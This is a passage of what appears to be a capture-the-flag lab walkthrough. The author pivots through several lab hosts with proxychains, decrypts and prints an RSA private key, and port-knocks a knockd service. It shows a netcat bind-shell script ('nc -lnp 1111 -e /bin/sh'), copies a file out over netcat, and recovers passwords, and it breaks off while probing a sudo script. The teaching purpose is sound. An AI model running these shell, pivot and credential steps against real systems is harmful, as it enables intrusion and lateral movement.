+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:# openssl rsa -in terra_key -out terra_key_nopass
+</span><span class='line'>Enter pass phrase <span class="k">for </span>terra_key: <span class="c"># entered Nk9yY31hva8q</span>
+</span><span class='line'>writing RSA key
+</span><span class='line'>
+</span><span class='line'>root@kali:~# cat terra_key_nopass
+</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
+</span><span class='line'>w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
+</span><span class='line'>DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
+</span><span class='line'>12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
+</span><span class='line'>sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
+</span><span class='line'>b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
+</span><span class='line'>fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
+</span><span class='line'>KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
+</span><span class='line'>KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
+</span><span class='line'>5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
+</span><span class='line'>P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
+</span><span class='line'>ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
+</span><span class='line'>bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
+</span><span class='line'>JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
+</span><span class='line'>cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
+</span><span class='line'>gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
+</span><span class='line'>+2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
+</span><span class='line'>agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
+</span><span class='line'>pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
+</span><span class='line'>ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
+</span><span class='line'>WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
+</span><span class='line'>7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
+</span><span class='line'>W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
+</span><span class='line'>bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
+</span><span class='line'>mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw<span class="o">==</span>
+</span><span class='line'>-----END RSA PRIVATE KEY-----
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Considering that <strong>192.168.3.50</strong> was named as <code>terra</code> in that <code>/etc/hosts</code> file, I attempted authentication using this key on it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ssh -D 8001 terra@192.168.3.50 -i terra_key_nopass
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>Linux dev2 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>You have mail.
+</span><span class='line'>Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
+</span><span class='line'>terra@dev2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, I also opened another socks proxy locally on port <code>tcp/8001</code> in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to <code>dev2</code> in red:</p>
+
+<p><img src="https://i.imgur.com/Pt8SFVJ.png"></p>
+
+<h2>letting myself in via the back door</h2>
+
+<p>Enumerating <code>dev2</code> did not reveal much interesting information. In fact, the most important clue found was in a mail for <code>terra</code> from Locke:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>terra@dev2:~<span class="nv">$ </span>cat /var/spool/mail/terra
+</span><span class='line'>Return-path: &lt;locke@192.168.4.100&gt;
+</span><span class='line'>Received: from locke by 192.168.4.100 with <span class="nb">local</span> <span class="o">(</span>Exim 4.80<span class="o">)</span>
+</span><span class='line'>~       <span class="o">(</span>envelope-from &lt;locke@adm&gt;<span class="o">)</span>
+</span><span class='line'>~       id 1XHczw-0000V2-8y
+</span><span class='line'>~       <span class="k">for </span>terra@192.168.3.50<span class="p">;</span> Wed, 13 Aug 2014 19:10:08 +0100
+</span><span class='line'>
+</span><span class='line'>Date: Wed, 13 Aug 2014 19:10:08 +0100
+</span><span class='line'>To: terra@192.168.3.50
+</span><span class='line'>Subject: Port Knock
+</span><span class='line'>User-Agent: Heirloom mailx 12.5 6/20/10
+</span><span class='line'>MIME-Version: 1.0
+</span><span class='line'>Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+</span><span class='line'>Content-Transfer-Encoding: 7bit
+</span><span class='line'>Message-Id: &lt;E1XHczw-0000V2-8y@adm&gt;
+</span><span class='line'>From: locke@192.168.4.100
+</span><span class='line'>~
+</span><span class='line'>Hi Terra,
+</span><span class='line'>
+</span><span class='line'>I<span class="err">&#39;</span>ve been playing with a port knocking daemon on my PC - see <span class="k">if </span>you can use that to get a shell.
+</span><span class='line'>Let me know how it goes.
+</span><span class='line'>
+</span><span class='line'>Regards,
+</span><span class='line'>Locke
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on <strong>192.168.4.100</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># /etc/proxychains.conf has line</span>
+</span><span class='line'><span class="c"># socks5    127.0.0.1 8001</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># scans will appear to be coming from 192.168.4.50 for</span>
+</span><span class='line'><span class="c"># 192.168.4.100</span>
+</span><span class='line'>root@kali:~# proxychains nmap -sT 192.168.4.100
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-09 17:39 SAST
+</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.4.100
+</span><span class='line'>Host is up <span class="o">(</span>0.0018s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: 999 closed ports
+</span><span class='line'>PORT   STATE SERVICE
+</span><span class='line'>22/tcp open  ssh
+</span><span class='line'>
+</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 1.75 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Only <code>tcp/22</code>. :s</p>
+
+<p>I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a> (<code>knockd</code>), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file <a href="https://github.com/jvinet/knock/blob/master/knockd.conf">here</a>, which revealed the default sequence of: <code>7000,8000,9000</code>. So, I tested this by attempting to connect with <code>nc</code> to these ports on <strong>192.168.4.100</strong>, and following up with a nmap:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>terra@dev2:~<span class="nv">$ </span>nc -v 192.168.4.100 7000 -w 1<span class="p">;</span> nc -v 192.168.4.100 8000 -w 1<span class="p">;</span> nc -v 192.168.4.100 9000 -w 1
+</span><span class='line'>192.168.4.100: inverse host lookup failed: Host name lookup failure
+</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.4.100<span class="o">]</span> 7000 <span class="o">(</span>afs3-fileserver<span class="o">)</span> : Connection refused
+</span><span class='line'>192.168.4.100: inverse host lookup failed: Host name lookup failure
+</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.4.100<span class="o">]</span> 8000 <span class="o">(</span>?<span class="o">)</span> : Connection refused
+</span><span class='line'>192.168.4.100: inverse host lookup failed: Host name lookup failure
+</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.4.100<span class="o">]</span> 9000 <span class="o">(</span>?<span class="o">)</span> : Connection refused
+</span><span class='line'>terra@dev2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The nmap after the knock:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains nmap -sT 192.168.4.100
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-09 17:45 SAST
+</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.4.100
+</span><span class='line'>Host is up <span class="o">(</span>0.0015s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: 998 closed ports
+</span><span class='line'>PORT     STATE SERVICE
+</span><span class='line'>22/tcp   open  ssh
+</span><span class='line'>1111/tcp open  lmsocialserver
+</span><span class='line'>
+</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 1.71 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A new port! <code>tcp/1111</code> :) Lets check it out.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains nc 192.168.4.100 1111
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># a new connection has no output. Only after typing</span>
+</span><span class='line'><span class="c"># &#39;crap&#39; do you realise you have a sh session open</span>
+</span><span class='line'>
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Shell access as <code>locke</code> on <strong>192.168.4.100</strong>. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&hellip; The new connection denoted in red again:</p>
+
+<p><img src="https://i.imgur.com/u2klDxc.png"></p>
+
+<h2>busting kefka</h2>
+
+<p>The shell on <code>adm</code> as <code>locke</code> was nothing more than a <code>/bin/sh</code> instance executed over <code>netcat</code>. This can be seen in the <code>littleShell.sh</code> file in <code>/home/locke</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat littleShell.sh
+</span><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'>
+</span><span class='line'>/bin/nc -lnp 1111 -e <span class="s1">&#39;/bin/sh&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Other interesting files were all in <code>locke</code>&rsquo;s home directory:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/home/locke
+</span><span class='line'>ls -lh
+</span><span class='line'>total 332K
+</span><span class='line'>-rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
+</span><span class='line'>-rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
+</span><span class='line'>-rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>note.txt</code> file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat note.txt
+</span><span class='line'>Looks like Kefka may have been abusing our removable media policy.  I<span class="err">&#39;</span>ve extracted this image to have a look.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the <code>diskimage.tar.gz</code> file to progress. The first thing I had to do was get a local copy of <code>diskimage.tar.gz</code>. Out comes <code>netcat</code> again :) I hosted the file on <code>tcp/4444</code> on <strong>192.168.4.100</strong> with <code>nc -lvp 4444 &lt; diskimage.tar.gz | xxd -p</code>. I then read the file on my attacking machine with <code>timeout 5 proxychains nc 192.168.4.100 4444 &gt; diskimage.tar.gz</code> (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).</p>
+
+<p>I had to carve out the string <em>ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</em> out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple <code>dd</code> on the top line and it was gone :)</p>
+
+<p>I then extracted the archive and ran the resultant archive through <code>file</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tar xvf diskimage.tar.gz
+</span><span class='line'>diskimage
+</span><span class='line'>
+</span><span class='line'>root@kali:~# file -k diskimage
+</span><span class='line'>diskimage: x86 boot sector, code offset 0x3c, OEM-ID <span class="s2">&quot;MSDOS5.0&quot;</span>, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 <span class="o">(</span>volumes &gt; 32 MB<span class="o">)</span> , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT <span class="o">(</span>16 bit<span class="o">)</span> DOS executable <span class="o">(</span>COM<span class="o">)</span>, boot code
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, so this really looks like a disk image. I decided to mount it and have a look inside:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# mount diskimage /mnt/
+</span><span class='line'>
+</span><span class='line'>root@kali:~# ls -lah /mnt/
+</span><span class='line'>total 21K
+</span><span class='line'>drwxr-xr-x  2 root root  16K Jan  1  1970 .
+</span><span class='line'>drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
+</span><span class='line'>-rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar
+</span><span class='line'>
+</span><span class='line'><span class="c"># oh! a .rar? Lets extract...</span>
+</span><span class='line'>root@kali:~# unrar x /mnt/Secret.rar
+</span><span class='line'>
+</span><span class='line'>UNRAR 4.10 freeware      Copyright <span class="o">(</span>c<span class="o">)</span> 1993-2012 Alexander Roshal
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Extracting from /mnt/Secret.rar
+</span><span class='line'>
+</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> <span class="k">for </span>MyPassword.txt:
+</span><span class='line'>
+</span><span class='line'>No files to extract
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A <code>.rar</code> archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&hellip;</p>
+
+<p>Some googling around got me a hit on a tool called <code>autopsy</code>, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:</p>
+
+<p><img src="https://i.imgur.com/SBIbnMU.png"></p>
+
+<p><code>C:/Funky.wav</code>. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the <em>Export</em> link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.</p>
+
+<p>It sounded like this:</p>
+
+<p><img src="http://i.imgur.com/IbdKBKR.gif"></p>
+
+<p>Yeah, I don&rsquo;t get it either. I was stumped for a few minutes again, until I remembered <a href="http://vulnhub.com/entry/xerxes-201,97/">Xerxes2</a>, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by <a href="http://www.sonicvisualiser.org/index.html">Sonic Visualizer</a>. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:</p>
+
+<p><img src="https://i.imgur.com/7bxW0Xc.png"></p>
+
+<p><em>OrcWQi5VhfCo</em>. Was this the password for the <code>.rar</code> archive?</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# unrar x /mnt/Secret.rar
+</span><span class='line'>
+</span><span class='line'>UNRAR 4.10 freeware      Copyright <span class="o">(</span>c<span class="o">)</span> 1993-2012 Alexander Roshal
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Extracting from /mnt/Secret.rar
+</span><span class='line'>
+</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> <span class="k">for </span>MyPassword.txt:
+</span><span class='line'>
+</span><span class='line'>Extracting  MyPassword.txt                                            OK
+</span><span class='line'>All OK
+</span><span class='line'>root@kali:~# cat MyPassword.txt
+</span><span class='line'>5224XbG5ki2C
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yep! However, another random string. Remembering the note about this being a disk image from <code>kefka</code>, I attempted to SSH into <strong>192.168.4.100</strong> as <code>kefka</code> with this password:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ssh -D 8002 kefka@192.168.4.100
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>kefka@192.168.4.100<span class="err">&#39;</span>s password: <span class="c"># entered 5224XbG5ki2C</span>
+</span><span class='line'>Linux adm 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
+</span><span class='line'>kefka@adm:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A final <code>tcp/8002</code> proxy was opened on my attacking machine.</p>
+
+<h2>taking the last ride to the flag</h2>
+
+<p>Enumeration as kefka revealed that this user is allowed to run <code>/opt/wep2.py</code> as root. This is almost screaming at me as the privilege escalation path!</p>
+
+<p>I ran the script with sudo, just to be presented with&hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>kefka@adm:~<span class="nv">$ </span>sudo /opt/wep2.py
+</span><span class='line'>^CTraceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;/opt/wep2.py&quot;</span>, line 93, in &lt;module&gt;
+</span><span class='line'>    sock, <span class="nv">addr</span> <span class="o">=</span> s.accept<span class="o">()</span>
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/socket.py&quot;</span>, line 202, in accept
+</span><span class='line'>    sock, <span class="nv">addr</span> <span class="o">=</span> self._sock.accept<span class="o">()</span>
+</span><span class='line'>KeyboardInterrupt
+</span><span class='line'>kefka@adm:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I re-run the script backgrounding it with <code>&amp;</code>, and inspect the output of <code>netstat -pant</code> to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new <code>tcp/8002</code> proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># /etc/proxychains.conf has line</span>
+</span><span class='line'><span class="c"># socks5    127.0.0.1 8002</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># connections will appear to be coming from localhost</span>
+</span><span class='line'>root@kali:~# proxychains nc -v 127.0.0.1 1234
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>127.0.0.1: inverse host lookup failed:
